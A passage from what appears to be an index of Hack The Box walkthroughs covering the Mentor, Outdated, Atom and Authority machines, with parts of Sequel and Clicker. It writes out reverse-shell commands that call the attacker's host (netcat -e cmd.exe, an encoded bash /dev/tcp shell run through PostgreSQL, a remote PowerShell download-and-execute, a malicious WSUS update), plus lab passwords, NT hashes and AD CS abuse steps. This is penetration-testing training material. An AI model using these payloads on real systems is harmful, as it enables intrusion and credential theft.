- `nxc winrm sequel.htb -u Users.txt -p 'WqSZAF6CysDQbGb3'`
- `evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'`
- `bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c`

### Artifacts and exact search anchors

`DC01.sequel.htb`, `sequel.htb`, `/etc/hosts`, `workbook.xml`, `xp_cmdshell`, `C:\Users\sql_svc\Desktop\nc64.exe`, `C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.9 4455`, `C:\Windows\system32`, `C:\ directory`, `sql-Configuration.INI`, `C:\SQL2019\ExpressAdv_ENU`, `SETUP.EXE.CONFIG`, `SQLSETUPBOOTSTRAPPER.DLL`, `C:\Users\ryan\Documents`, `C:\Users\ryan\Desktop`, `C:\Users\ryan\Desktop\user.txt`, `BloodHound.py`, `20250505081224_bloodhound.zip`

Open the PDF around page **7** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Ryan has WriteOwner over ca_svc: take ownership, grant Ryan ResetPassword, and reset ca_svc's password.
- ca_svc is in Cert Publishers; certipy reveals dangerous rights over DunderMifflinAuthentication (ESC4).
- Use certipy template -save-old to modify the template into an enrollee-supplies-subject/client-auth configuration, then request a certificate with Administrator UPN.
- Authenticate with administrator.pfx to recover the Administrator NT hash and use WinRM pass-the-hash.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Root / Administrator path

**Memory chain:** BloodHound path analysis → ACL abuse → WinRM → SMB enumeration → AD CS/certificate abuse → PFX/certificate-key recovery → private-key discovery → pass-the-hash → Kerberos ticket abuse

- This privilege allows the user ryan to control the CA_SVC account, including modifying its properties and changing its password.
- This suggests the presence of Active Directory Certificate Services .
- start by modifying the certificate template to make it exploitable by ca_svc .
- With this setup, we can request a certificate from a highly privileged user such as Administrator .
- If we run certipy find again, we see that the template is vulnerable to ESC1 , ESC2 , ESC3 , and ESC4 .

#### Commands and PDF search strings

- `netexec smb sequel.htb -u ca_svc -p 'Password123!!'`
- `certipy find -u 'ca_svc@sequel.htb' -p 'Password123!!' -dc-ip 10.10.11.51 -stdout`
- `Certipy v4.8.2 - by Oliver Lyak (ly4k)`
- `certipy template -u ca_svc@sequel.htb -p 'Password123!!' -template`
- `certipy req -username ca_svc@sequel.htb -p 'Password123!!' -ca sequel-DC01-CA template DunderMifflinAuthentication -target dc01.sequel.htb -upn`
- `certipy auth -pfx administrator.pfx -domain sequel.htb`
- `evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff`
- `Evil-WinRM shell v3.7`

### Artifacts and exact search anchors

`C:\Users\ryan\Documents`, `PowerView.ps1`, `sequel.htb`, `DunderMifflinAuthentication.json`, `dc01.sequel.htb`, `administrator.pfx`, `C:\Users\Administrator\Documents`, `C:\Users\Administrator\Desktop`

Open the PDF around page **12** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 57- Mentor

**Target:** Linux · Medium

[Detailed notes](./htb-writeups/Mentor.md) · [Official PDF](./htb-writeups/Mentor.pdf)

### Machine path overview

Mentor is a medium difficulty Linux machine whose path includes pivoting through four different users before arriving at root. After scanning an SNMP service with a community string that can be brute forced, plaintext credentials are discovered which are used for an API endpoint, which proves to be vulnerable to blind remote code execution and leads to a foothold on a docker container. Enumerating the container's network reveals a PostgreSQL service on another container, which can be leveraged into RCE by authenticating using default credentials. Examining an old database backup on the PostgreSQL container reveals a hash, which once cracked is used to SSH into the machine. Finally, by examining the configuration files on the host, the attacker is able to retrieve a password for user james , who is able run the /bin/sh command with sudo privileges, thereby instantly forfeiting root privileges.

### Remote enumeration and foothold checks

- Vhost fuzz mentorquotes.htb while filtering the wildcard 302 responses; api.mentorquotes.htb and /docs expose the API shape.
- Register/login to understand JWT use, but also scan UDP: brute-force the SNMP community string and walk the non-default internal community.
- SNMP output leaks James's API password; authenticate as James and test alternate HTTP methods on /admin/backup.
- The backup endpoint has blind command injection; verify with an out-of-band callback before sending the reverse shell.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Enumerate SNMP with common/default community strings and walk users, processes, installed software, listening ports, and command-line arguments—not only system metadata.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.

### Post-foothold local enumeration and lateral movement

- The first shell is inside Docker (.dockerenv). Scan the container subnet; 172.22.0.4 exposes PostgreSQL on 5432.
- Reverse-forward PostgreSQL with chisel and try postgres:postgres; the role is superuser and permits database-to-OS command execution.
- In /var/lib/postgresql/data/pg_backup/db_export.sql, recover the service-account hash, crack it, and infer that the database service_acc email maps to host user svc.
- SSH to the actual host as svc rather than attempting to persist in the database container.

### User path

**Memory chain:** SSH → group-membership abuse → SNMP enumeration → virtual-host enumeration → directory/file discovery → subdomain enumeration → API enumeration → reverse shell → Docker/container escape → database enumeration

- Directory enumeration We proceed to perform a directory bruteforce search using Gobuster . gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directorieslowercase.txt -u http://api.mentorquotes.htb The tool reveals the /docs directory, which returns a response code of 200 .
- can use a tool like SNMPBrute for this purpose. python3 snmpbrute.py -t 10.10.11.193 -f /usr/share/seclists/Discovery/SNMP/common-snmpcommunity-strings.txt The output reveals an additional community string, namely internal , which we proceed to scan. snmpwalk -v2c -c internal 10.10.11.193 During our snmpwalk , we identified a string that resembles a password.
- Lateral Movement Checking the root directory we find a .dockerenv file, confirming our hypothesis that we obtained a shell inside a container.
- DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5LzQ0NDQgMD4mMQo=|base64 -d|bash'; The commands are successful and we obtain a reverse shell as the postgres user on the container.
- Our shell is spawned in the /var/lib/postgresql/data/ directory, where we find a pg_backup folder that contains an exported SQL file.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV`
- `sudo nmap -sU -F 10.10.11.193`
- `ffuf -u http://10.10.11.193 -H 'Host: FUZZ.mentorquotes.htb' -w`
- `ffuf -u http://10.10.11.193 -H 'Host: FUZZ.mentorquotes.htb' -mc 200,404 -w`
- `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directorieslowercase.txt -u http://api.mentorquotes.htb`
- `curl api.mentorquotes.htb/auth/signup -X POST -H 'Content-Type: application/json' -d`
- `curl api.mentorquotes.htb/auth/login -X POST -H 'Content-Type: application/json' -d`
- `curl http://api.mentorquotes.htb/admin/ -H 'Authorization:`
- `snmpwalk -v2c -c public 10.10.11.193`
- `snmpwalk -v2c -c internal 10.10.11.193`
- `curl http://api.mentorquotes.htb/auth/login -X POST -H 'Content-Type: application/json'`
- `curl http://api.mentorquotes.htb/admin/backup -H 'Authorization:`
- `wget 10.10.14.19:8000/nmap`
- `wget 10.10.14.19:8000/chisel`
- `SELECT * FROM cmd_exec;`
- `hashcat hash /usr/share/wordlists/rockyou.txt -m 0`

### Artifacts and exact search anchors

`mentorquotes.htb`, `/etc/hosts`, `FUZZ.mentorquotes.htb`, `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`, `api.mentorquotes.htb`, `/usr/share/seclists/Discovery/Web-Content/raft-medium-directorieslowercase.txt`, `mentor.htb`, `snmpbrute.py`, `/usr/share/seclists/Discovery/SNMP/common-snmpcommunity-strings.txt`, `/tmp/nmap`, `/tmp/chisel`, `/var/lib/postgresql/data/`, `/var/lib/postgresql/data/pg_backup/db_export.sql`, `/usr/share/wordlists/rockyou.txt`, `/home/svc/user.txt`

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Because SNMP was exposed, inspect /etc/snmp/snmpd.conf on the host; it contains James's plaintext password.
- su to James and run sudo -l; James may execute /bin/sh as root without a password.
- Use sudo /bin/sh directly and verify effective UID 0.
- Enumerate SNMP with common/default community strings and walk users, processes, installed software, listening ports, and command-line arguments—not only system metadata.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.

### Root / Administrator path

**Memory chain:** SNMP enumeration → sudo rule abuse

- Since the SNMP daemon was running on the server, we examine the SNMP configuration by accessing the snmpd.conf file. cat /etc/snmp/snmpd.conf The file reveals a hardcoded, plaintext password, which we attempt to use to authenticate as the james user.
- To do so, we run the su command and insert the password SuperSecurePassword123__ . su james We have successfully obtained a shell as james .

#### Commands and PDF search strings

- `sudo -l`
- `sudo /bin/sh`

### Artifacts and exact search anchors

`snmpd.conf`, `/etc/snmp/snmpd.conf`, `/root/root.txt`

Open the PDF around page **19** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 58- Outdated

**Target:** Windows · Medium

[Detailed notes](./htb-writeups/Outdated.md) · [Official PDF](./htb-writeups/Outdated.pdf)

### Machine path overview

Outdated is a Medium Difficulty Windows Active Directory machine that features a foothold based on the Follina CVE of 2022. The box further encompasses an Active Directory scenario, where we must pivot from domain user to domain controller, using an array of tools to leverage the AD 's configuration and adjacent edges to our advantage. The final step includes taking advantage of Windows Server Update ServicesWSUS and using its poor configuration to compromise the domain controller.

### Remote enumeration and foothold checks

- Notice WSUS ports 8530/8531 and hostnames mail.outdated.htb and dc.outdated.htb during the first scan; preserve them for later.
- Try SMB null access: Shares is readable and contains the document that discloses the IT support mailbox and Follina/CVE-2022-30190 context.
- Generate the Follina document and deliver it to itsupport through the mail service (retry if necessary); host the MSDT payload and listener at the same time.
- Outdated is a Windows Active Directory target; Follina, WinRM, Shadow Credentials, and WSUS are Windows-domain steps despite the official synopsis's accidental 'Linux machine' wording.
- Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- For Shadow Credentials, confirm write access to `msDS-KeyCredentialLink`, add a key credential, obtain a TGT/NT hash with PKINIT, and clean up the added credential afterward.

### Post-foothold local enumeration and lateral movement

- Collect SharpHound as btables; ITStaff can write msDS-KeyCredentialLink on sflowers, who has PSRemote rights.
- Use Whisker/Shadow Credentials on sflowers, then execute the emitted Rubeus command to obtain sflowers's ticket and WinRM context.
- Use an attacker SMB share for BloodHound archives and other large exfiltration rather than relying on the shell transport.

### User path

**Memory chain:** SMB enumeration → CVE-2022-30190 → password cracking → path traversal → reverse shell → web shell/RCE → group-membership abuse → BloodHound path analysis → shadow credentials/PKINIT → private-key discovery

- SMB Port 445 in this context typically indicates the service SMB - Server Message Blocks, which essentially is a way to share files or other resources across a network.
- Moreover, the email address itsupport@outdated.htb is alluded to, which is particularly interesting since the first vulnerability mentioned in the document is CVE-2022-30190 , also known as Follina, a recent exploit on MS word/rtf docs, which is in part exploitable through email.
- then access that script from the target machine, which allows us to use a fully functional version of Whisker : iex(new-object net.webclient).downloadstring('http://10.10.14.5:8000/InvokeWhisker.ps1') We then use the tool to target the sflowers user.
- Invoke-Whisker -command "add /target:sflowers" The final section of the condensed output is a Rubeus command, which is another tool with which we can get a Golden Ticket for this domain.
- In summary, a Golden Ticket attack targets the Active Directory Key Distribution Service Account (KRBTGT), essentially using that account to forge valid Ticket Granting Tickets (TGTs), which in turn give the attacker access to any resource on that domain.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.175`
- `smbclient -N -L outdated.htb`
- `smbclient -N \\\\outdated.htb\\Shares`
- `impacket-smbserver share . -smb2support -user user -password pass`
- `evil-winrm -i dc.outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5`

### Artifacts and exact search anchors

`mail.outdated.htb`, `dc.outdated.htb`, `outdated.htb`, `CVE-2022-30190`, `C:\\Windows\\Tasks\\nc.exe`, `C:\\Windows\\Tasks\\nc.exe -e cmd.exe 10.10.14.5`, `follina.py`, `/etc/hosts`, `20221108140327_BloodHound.zip`, `Invoke-Whisker.ps1`, `InvokeWhisker.ps1`, `msDS-KeyCredentialLink`, `C:\Users\sflowers\Desktop\user.txt`

Open the PDF around page **5** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Check whoami /groups: sflowers belongs to the WSUS group.
- Read HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate and the AU subkey; verify the non-TLS wsus.outdated.htb server and UseWUServer=1.
- Use SharpWSUS to create a malicious PsExec/system update, approve it specifically for dc.outdated.htb and the created group, then wait/trigger installation with the listener ready.

### Root / Administrator path

**Memory chain:** registry secrets → BloodHound path analysis → group-membership abuse → WinRM → reverse shell → WMI/PowerShell remoting

- To do that, we upload Netcat to the target system. iwr http://10.10.14.5:8000/nc64.exe -o nc64.exe While listening on port 4444 locally, run Netcat to get our reverse shell. start-process .\nc64.exe -args "-e cmd.exe 10.10.14.5 4444" We are now ready to start exploiting WSUS .
- Following along with the aforementioned blogpost, we find a section that covers Lateral movement using psexec , a binary which is also found in sflowers ' Desktop directory.
- The following command creates a malicious WSUS update, whose payload is a Netcat reverse shell.
- SharpWSUS.exe create /payload:"C:\users\sflowers\Desktop\PsExec64.exe" /args:"accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.5 9001" /title:"pwned" We also find the next commands we need to run in the tail of the output.
- The final flag can be found at C:\Users\Administrator\Desktop\root.txt .

#### Commands and PDF search strings

- `whoami /groups`
- `evil-winrm shell. To do that, we upload Netcat to the target system.`

### Artifacts and exact search anchors

`wsus.outdated.htb`, `Invoke-SharpWSUS.ps1`, `SharpWSUS.gz`, `C:\users\sflowers\Desktop\PsExec64.exe`, `c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.5 9001`, `dc.outdated.htb`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **13** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 59- Atom

**Target:** Windows · Medium

[Detailed notes](./htb-writeups/Atom.md) · [Official PDF](./htb-writeups/Atom.pdf)

### Machine path overview

Atom is a Medium Windows machine that features a hosting of Electron software. The website hosts a windows version of the application (Electron Builder) where a vulnerability in signature validation can lead to remote command execution and thus get a foothold on system as user jason. By capturing the password of Redis service from configuration file it was possible to get the encrypted password of user Administrator. By using exploitation for the PortableKanban the administrator's password can be decrypted and thus login through winrm to the system. Note: IP target address might differ.

### Remote enumeration and foothold checks

- Test SMB guest/anonymous separately from Redis; Software_Updates is readable and writable even though Redis initially requires an unknown password.
- Read UAT_Testing_Procedures.pdf: QA automatically tests files placed in client update folders.
- Capture the Electron application's update request to learn that it fetches latest.yml from updates.atom.htb.
- Exploit electron-builder update signature handling: build a higher-version latest.yml with the correct SHA-512/Base64 metadata and place it with the reverse-shell executable in Software_Updates.
- The electron-builder signature bypass depends on placing a single quote in the payload filename (for example s'hell.exe) and using that exact quoted name in both the url and path fields of latest.yml; the higher version and SHA-512 metadata alone do not bypass validation.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Test SMB/RPC as `guest` with no password as a separate case from a blank null session. Use it for share listing and SID/RID enumeration even if file access is limited.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.

### Post-foothold local enumeration and lateral movement

- From Jason, inspect Downloads for PortableKanban and identify its hard-coded DES key/IV password-storage weakness.
- PortableKanban data is backed by Redis here; inspect C:\Program Files\Redis\redis.windows-service.conf for requirepass.
- Authenticate to Redis, retrieve the user records/EncryptedPassword, and decrypt the Administrator value with the PortableKanban DES routine.

### User path

**Memory chain:** database enumeration → SMB enumeration → web shell/RCE → command injection

- Redis We can use redis-cli to connect to this service. redis-cli -h 10.10.10.233 This service requires authentication.
- SMB Checking access to SMB reveals that it allows guest sessions which we can list the shares that are indeed accessible. smbmap -u anonymous -p anonymous -H 10.10.10.233 We've read and write access to Software_Updates folder.
- Assuming that the updates.atom.htb is running internally on the target server and its server folder (webroot) is exposed via smb share Software_Updates this can be exploited.
- setup a listener on port 4444 and upload the s'hell.exe and latest.yml files in any of the folders in the Software_Updates share.
- In a minute or so we receive a shell as user jason .

#### Commands and PDF search strings

- `nmap -p$ports -sV -sC 10.10.10.233`
- `smbmap -u anonymous -p anonymous -H 10.10.10.233`
- `smbmap -u anonymous -p anonymous -H 10.10.10.233 -R Software_Updates`
- `smbmap -u anonymous -p anonymous -H 10.10.10.233 --download`

### Artifacts and exact search anchors

`heed_setup_v1.0.0.zip`, `updates.atom.htb`, `latest.yml`

Open the PDF around page **10** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Reuse the decrypted Administrator password over WinRM and verify the administrative context.

### Root / Administrator path

**Memory chain:** database enumeration → WinRM

- It has a know vulnerability where this software uses a hardcoded DES key and IV values which can be leveraged to decrypt the password that is required to login to this software.
- The script extracts the encrypted password of Administrator user from PortableKanban.pk3 file. for user in data["Users"]: print("{}:{}".format(user["Name"],decode(user["EncryptedPassword"]))) But as we don't have that file in this folder we download the software from this link.
- can view the password which is kidvscat_yes_kidvscat .
- decrypt this by using the below python script. import base64 from des import * hash = base64.b64decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'.encode('utf-8')) key = DesKey(b"7ly6UznJ") print(key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')) This is successful and we can now get the Administrator password kidvscat_admin_@123 .
- can also reuse this password on the WinRM service to gain a shell on the target server. evil-winrm -i 10.10.10.233 -u administrator -p kidvscat_admin_@123

#### Commands and PDF search strings

- `evil-winrm -i 10.10.10.233 -u administrator -p kidvscat_admin_@123`

### Artifacts and exact search anchors

`C:\Program Files folder and the redis.windows-service.conf file that loads`, `redis.windows-service.conf`

Open the PDF around page **13** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 60- Authority

**Target:** Windows / Active Directory · Medium

[Detailed notes](./htb-writeups/Authority.md) · [Official PDF](./htb-writeups/Authority.pdf)

### Machine path overview

Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.

### Remote enumeration and foothold checks

- Test SMB null access: Development is readable even though the other non-default shares deny access; recursively download its full Automation/Ansible tree.
- Inspect the PWM Ansible role, including defaults/main.yml, tomcat templates, inventory, and vault values; do not stop at plaintext strings that fail to authenticate.
- Extract each Ansible Vault value, convert with ansible2john, crack mode 16900, then decrypt pwm_admin_login, pwm_admin_password, and ldap_admin_password.
- Use the PWM configuration password at https://target:8443/pwm/private/login; in the LDAP profile, redirect the LDAP URL to an attacker listener and use Test LDAP Profile to capture svc_ldap's cleartext bind password.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
- Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.

### Post-foothold local enumeration and lateral movement

- Authenticate as svc_ldap and enumerate AD CS with certipy find -vulnerable.
- CorpVPN is ESC1 but enrollment is granted to Domain Computers, not svc_ldap directly; check MachineAccountQuota before assuming exploitation is blocked.

### User path

**Memory chain:** anonymous Development SMB share → Ansible Vault cracking → PWM LDAP-profile credential capture → svc_ldap

- Browsing to port 8443 using https:// , we are redirected to /pwm/private/login , which appears to be an instance of an open-source password self-service application that can be use with LDAP in Active Directory environments.
- When visiting the site, we get a popup showing that the application is in Configuration Mode , so it seems we need to get into the Configuration Manager or Configuration Editor , which both just take a password; no username needed.
- see a share named ADCS which, along with the box name, could be a hint that Active Directory Certificate Services (AD CS) is installed on the target.
- promptly get a callback on our listener that contains the password for the svc_ldap account. nc -lvnp 389 listening on [any] 389 ... connect to [10.10.14.20] from (UNKNOWN) [10.10.11.222] 56867 0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
- try using the credentials to win-rm into the machine: evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' Evil-WinRM shell v3.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami htb\svc_ldap The user flag can be found at C:\Users\svc_ldap\Desktop\user.txt .

#### Commands and PDF search strings

- `nmap -p- 10.10.11.222`
- `Nmap done: 1 IP address (1 host up) scanned in 241.10 seconds`
- `smbclient --no-pass -L //10.10.11.222`
- `smbclient //10.10.11.222/Development -N`
- `smbclient //10.10.11.222/Development -N -c 'prompt OFF;recurse ON;lcd`
- `hashcat -m 16900 vault_hashes /usr/share/wordlists/rockyou.txt`
- `hashcat (v6.1.1) starting...`
- `evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'`
- `Evil-WinRM shell v3.3`

### Artifacts and exact search anchors

`main.yml`, `context.xml`, `tomcat-users.xml`, `authority.htb`, `ansible2john.py`, `/usr/share/john/ansible2john.py`, `/usr/share/wordlists/rockyou.txt`, `C:\Users\svc_ldap\Documents`, `C:\Users\svc_ldap\Desktop\user.txt`

Open the PDF around page **8** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use the default MAQ to add an attacker-controlled computer account over LDAPS.
- Enroll in CorpVPN as that machine while supplying Administrator as the SAN/UPN.
- certipy auth with administrator_authority.pfx fails with KDC_ERR_PADATA_TYPE_NOSUPP because this DC does not support PKINIT. Extract administrator.crt and administrator.key from the PFX with OpenSSL, then use PassTheCert over LDAPS/Schannel instead of repeatedly troubleshooting Kerberos.
- Use PassTheCert with `-action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'EVIL01$'`; then request `cifs/AUTHORITY.authority.htb` while impersonating Administrator, export the ccache, and run `secretsdump -k`. Do not try to grant direct DCSync rights with the certificate.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- For RBCD, obtain/control a machine account, write `msDS-AllowedToActOnBehalfOfOtherIdentity`, request an impersonation service ticket, and use the ticket against the correct SPN.

### Root / Administrator path

**Memory chain:** MachineAccountQuota computer account → ESC1 CorpVPN certificate as Administrator → PKINIT unsupported → PassTheCert RBCD to AUTHORITY$ → impersonate Administrator for CIFS → Kerberos secretsdump

- This means that we can request a certificate on behalf of another user, such as a Domain Admin.
- To use this tool, we first must extract the .crt and .key files from the .pfx certificate file using OpenSSL.

#### Commands and PDF search strings

- `certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip`
- `Certipy v4.8.2 - by Oliver Lyak (ly4k)`
- `crackmapexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ`
- `certipy req -username EVIL01$ -password 'Str0ng3st_P@ssw0rd!' -ca AUTHORITY-CA dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns`
- `certipy auth -pfx administrator_authority.pfx -debug`
- `impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator`
- `impacket-secretsdump -k -no-pass`
- `evil-winrm -i 10.10.11.222 -u administrator -H 6961f422924da90a6928197429eea4ed`
- `Evil-WinRM shell v3.3`

### Artifacts and exact search anchors

`authority.htb`, `20231013125232_Certipy.zip`, `20231013125232_Certipy.json`, `authority.authority.htb`, `/etc/hosts`, `addcomputer.py`, `administrator_authority.pfx`, `administrator.key`, `passthecert.py`, `msDS-AllowedToActOnBehalfOfOtherIdentity`, `C:\Users\Administrator\Documents`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **9** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 61- Clicker

**Target:** Linux · Medium

[Detailed notes](./htb-writeups/Clicker.md) · [Official PDF](./htb-writeups/Clicker.pdf)

### Machine path overview

Clicker is a Medium Linux box featuring a Web Application hosting a clicking game. Enumerating the box, an attacker is able to mount a public NFS share and retrieve the source code of the application, revealing an endpoint susceptible to SQL Injection. Exploiting this vulnerability, an attacker can elevate the privileges of their account and change the username to include malicious PHP code. Accessing the admin panel, an export feature is abused to create a PHP file including the modified username, leading to arbitrary code execution on the machine as www-data . Enumeration reveals an SUID binary that can access files under the home folder of the user jack . By performing a path traversal attack on the binary, the attacker is able to get the SSH key of jack , who is allowed to run a monitoring script with arbitrary environment variables with sudo . The monitoring script expects a response to a curl request in XML format. The attacker, by setting the http_proxy variable, is able to intercept and alter the response to the script, in order to include an XXE payload to read the SSH key of the root user. Finally, the attacker is able to use the SSH key and get access as the root user on the remote machine.

### Remote enumeration and foothold checks

- Run showmount and mount the world-accessible /mnt/backups NFS export; retrieve clicker.htb_backup.zip and review source rather than blind-fuzzing only.
- In db_utils.php save_profile, the parameter values are quoted but attacker-controlled parameter names permit SQL assignment injection.
- Use the injection to raise the account role and put PHP code in the username, then abuse the admin export filename/format to create an executable PHP file.
- Run `showmount -e`, mount exported NFS paths, inspect UID/GID behavior, and check whether `no_root_squash` or writable content enables escalation.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.

### Post-foothold local enumeration and lateral movement

- Enumerate custom SUID files; /opt/manage/execute_query is more important than standard SUID entries.
- Read /opt/manage/README.txt, trace/strings the binary, and fuzz an invalid action plus a second path argument; ../.ssh/id_rsa traverses into Jack's home.
- Save Jack's key with mode 600 and SSH as Jack.

### User path

**Memory chain:** SSH → NFS/share abuse → group-membership abuse → source-code review → SQL injection → web shell/RCE → reverse shell → SUID abuse → database enumeration → path traversal

- Looking around the webpage, we find out that we can register a new user: Once we register a new user and log in, nothing seems to significantly change to our advantage.
- can trace back the execution of this function and find that it can be triggered in the play.php page by clicking on the "Save and close" button.
- The $setStr variable is constructed as follows: foreach ($args as $key => $value) { $setStr .= $key . "=" . $pdo->quote($value) . ","; } For example, let's use the following payload in order to modify our role to "Admin".
- PHP Web Shell In order to execute code on the server, we need to insert PHP code into the exported table in some way.
- can once again exploit the first vulnerability in order to change our nickname to a malicious one, that includes PHP code.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.232`
- `showmount -e clicker.htb`
- `sudo mount -t nfs clicker.htb:/mnt/backups /mnt -o nolock`
- `ssh -i jack jack@clicker.htb`

### Artifacts and exact search anchors

`clicker.htb`, `/etc/hosts`, `clicker.htb_backup.zip`, `play.php`, `profile.php`, `authenticate.php`, `create_player.php`, `logout.php`, `register.php`, `index.php`, `db_utils.php`, `export.php`, `save_game.php`, `top_players_586n8am4.php`, `/var/www/clicker.htb/exports$`, `/usr/bin/sudo`, `/usr/bin/chsh`, `/usr/bin/gpasswd`, `/usr/bin/fusermount3`, `/usr/bin/su`, `/usr/sbin/mount.nfs`, `/opt/manage/execute_query`, `/opt/manage`, `/opt/manage/$`, `/home/jaH`, `/usr/binH`, `/home/jack/queries/clean.sql`, `/home/jack`, `/home/jack/user.txt`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- sudo -l allows SETENV NOPASSWD /opt/monitor.sh; inspect how the script calls curl and parses XML.
